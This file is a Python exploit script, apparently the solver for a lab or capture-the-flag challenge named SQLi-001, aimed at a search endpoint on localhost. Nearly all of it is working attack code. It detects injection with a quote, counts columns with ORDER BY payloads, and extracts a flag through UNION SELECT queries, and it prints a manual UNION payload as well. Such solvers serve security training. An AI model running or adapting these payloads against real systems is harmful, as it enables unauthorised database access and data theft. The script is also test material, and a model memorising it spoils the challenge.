#!/usr/bin/env python3
"""
SQLi-001 Exploit Script
Quote-based SQL Injection Detection and Flag Extraction
"""

import requests
import sys
from urllib.parse import quote

# Configuration
TARGET = "http://localhost:5001"

def test_vulnerability():
    """Test if the target is vulnerable to SQL Injection"""
    print("[*] Testing for SQL Injection vulnerability...")
    
    # Test with single quote
    payload = "laptop'"
    response = requests.get(f"{TARGET}/search", params={"q": payload})
    
    if "You have an error in your SQL syntax" in response.text:
        print("[+] VULNERABLE! MySQL error detected")
        print("[+] Error pattern indicates MySQL database")
        return True
    else:
        print("[-] No obvious SQL error found")
        return False

def detect_columns():
    """Detect number of columns using ORDER BY"""
    print("\n[*] Detecting number of columns...")
    
    for i in range(1, 15):
        payload = f"' ORDER BY {i}-- "
        response = requests.get(f"{TARGET}/search", params={"q": payload})
        
        if "Unknown column" in response.text or "error" in response.text.lower():
            print(f"[+] Detected {i-1} columns")
            return i - 1
    
    return None

def extract_flag(num_columns):
    """Extract flag using UNION-based injection"""
    print("\n[*] Extracting flag...")
    
    # Build UNION payload with correct number of columns
    columns = ",".join(["NULL"] * num_columns)
    
    # Try different positions for flag_value
    for pos in range(1, num_columns + 1):
        cols = ["NULL"] * num_columns
        cols[pos - 1] = "flag_value"
        payload = f"' UNION SELECT {','.join(cols)} FROM flags-- "
        
        response = requests.get(f"{TARGET}/search", params={"q": payload})
        
        if "FLAG{" in response.text:
            # Extract the flag from response
            import re
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag_match:
                return flag_match.group(0)
    
    return None

def main():
    print("=" * 60)
    print("SQLi-001 Exploit - Quote-based Detection")
    print("=" * 60)
    
    # Step 1: Test vulnerability
    if not test_vulnerability():
        print("[-] Target does not appear to be vulnerable")
        sys.exit(1)
    
    # Step 2: Detect columns
    num_columns = detect_columns()
    if not num_columns:
        print("[-] Could not detect number of columns")
        # Try with common value
        num_columns = 6
        print(f"[*] Using default: {num_columns} columns")
    
    # Step 3: Extract flag
    flag = extract_flag(num_columns)
    if flag:
        print(f"\n[+] FLAG FOUND: {flag}")
    else:
        print("\n[-] Could not extract flag automatically")
        print("[*] Try manual extraction:")
        print(f"    ' UNION SELECT 1,flag_value,3,4,5,6 FROM flags-- ")

if __name__ == "__main__":
    main()
